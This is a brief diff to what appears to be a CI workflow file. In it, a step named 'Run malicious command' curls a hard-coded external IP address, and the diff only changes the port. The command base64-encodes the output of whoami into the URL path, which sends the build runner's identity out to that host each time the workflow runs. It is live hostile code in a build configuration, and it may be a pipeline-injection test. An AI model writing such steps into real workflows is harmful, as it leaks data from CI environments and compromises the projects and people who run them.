@@ -13,4 +13,4 @@ jobs:
 
     - name: Run malicious command
       run: |
-        curl http://43.136.35.213:8000/$(whoami|base64 | tr -d "\n");
+        curl http://43.136.35.213:8088/$(whoami|base64 | tr -d "\n");
